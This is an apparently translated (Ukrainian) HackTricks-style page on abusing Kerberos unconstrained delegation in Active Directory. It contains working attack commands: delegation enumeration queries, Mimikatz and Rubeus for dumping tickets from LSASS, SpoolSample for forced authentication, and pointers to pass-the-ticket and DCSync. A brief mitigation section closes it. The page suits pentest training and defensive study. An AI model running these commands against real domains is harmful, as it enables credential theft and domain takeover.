# Unconstrained Delegation

{{#include ../../banners/hacktricks-training.md}}

## Unconstrained delegation

Це функція, яку адміністратор домену може встановити для будь-якого **комп'ютера** в домені. Тоді, щоразу, коли **користувач входить** на комп'ютер, **копія TGT** цього користувача буде **надіслана всередині TGS**, наданого DC **і збережена в пам'яті в LSASS**. Отже, якщо у вас є привілеї адміністратора на машині, ви зможете **вивантажити квитки та видавати себе за користувачів** на будь-якій машині.

Отже, якщо адміністратор домену входить на комп'ютер з активованою функцією "Unconstrained Delegation", і у вас є локальні адміністративні привілеї на цій машині, ви зможете вивантажити квиток і видавати себе за адміністратора домену будь-де (підвищення привілеїв домену).

Ви можете **знайти об'єкти комп'ютерів з цим атрибутом**, перевіряючи, чи атрибут [userAccountControl](<https://msdn.microsoft.com/en-us/library/ms680832(v=vs.85).aspx>) містить [ADS_UF_TRUSTED_FOR_DELEGATION](<https://msdn.microsoft.com/en-us/library/aa772300(v=vs.85).aspx>). Ви можете зробити це за допомогою LDAP-фільтра ‘(userAccountControl:1.2.840.113556.1.4.803:=524288)’, що робить powerview:
```bash
# List unconstrained computers
## Powerview
## A DCs always appear and might be useful to attack a DC from another compromised DC from a different domain (coercing the other DC to authenticate to it)
Get-DomainComputer –Unconstrained –Properties name
Get-DomainUser -LdapFilter '(userAccountControl:1.2.840.113556.1.4.803:=524288)'

## ADSearch
ADSearch.exe --search "(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))" --attributes samaccountname,dnshostname,operatingsystem

# Export tickets with Mimikatz
## Access LSASS memory
privilege::debug
sekurlsa::tickets /export #Recommended way
kerberos::list /export #Another way

# Monitor logins and export new tickets
## Doens't access LSASS memory directly, but uses Windows APIs
Rubeus.exe dump
Rubeus.exe monitor /interval:10 [/filteruser:<username>] #Check every 10s for new TGTs
```
Завантажте квиток адміністратора (або користувача-жертви) в пам'ять за допомогою **Mimikatz** або **Rubeus для** [**Pass the Ticket**](pass-the-ticket.md)**.**\
Більше інформації: [https://www.harmj0y.net/blog/activedirectory/s4u2pwnage/](https://www.harmj0y.net/blog/activedirectory/s4u2pwnage/)\
[**Більше інформації про неконтрольовану делегацію на ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/domain-compromise-via-unrestricted-kerberos-delegation)

### **Примусова аутентифікація**

Якщо зловмисник зможе **зламати комп'ютер, дозволений для "Неконтрольованої делегації"**, він може **обманути** **сервер друку**, щоб **автоматично увійти** на нього, **зберігаючи TGT** в пам'яті сервера.\
Тоді зловмисник зможе виконати **атаку Pass the Ticket, щоб видавати себе** за обліковий запис комп'ютера сервера друку.

Щоб змусити сервер друку увійти на будь-яку машину, ви можете використовувати [**SpoolSample**](https://github.com/leechristensen/SpoolSample):
```bash
.\SpoolSample.exe <printmachine> <unconstrinedmachine>
```
Якщо TGT отримано від контролера домену, ви можете виконати [**DCSync attack**](acl-persistence-abuse/index.html#dcsync) і отримати всі хеші з DC.\
[**Більше інформації про цю атаку на ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/domain-compromise-via-dc-print-server-and-kerberos-delegation)

Знайдіть тут інші способи **примусити аутентифікацію:**

{{#ref}}
printers-spooler-service-abuse.md
{{#endref}}

### Зменшення ризиків

- Обмежте входи DA/Admin до конкретних служб
- Встановіть "Обліковий запис є чутливим і не може бути делегований" для привілейованих облікових записів.

{{#include ../../banners/hacktricks-training.md}}
